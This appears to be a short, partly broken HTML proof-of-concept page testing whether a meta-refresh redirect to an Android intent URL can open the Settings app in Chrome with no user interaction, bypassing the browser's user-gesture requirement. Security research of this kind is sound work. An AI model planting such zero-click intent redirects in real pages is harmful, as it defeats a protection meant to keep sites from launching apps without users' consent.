<!DOCTYPE html>
<html>
<head>
  <title>Settings Auto Launch PoC</title>
  <!-- Zero-click launch using intent -->

        content="0;url=intent://#Intent;action=android.settings.SETTINGS;end">

  <h1>Settings Auto Launch PoC</h1>
  <p>If the Settings app opens automatically without interaction, Chrome user-gesture enforcement is bypassed.</p>
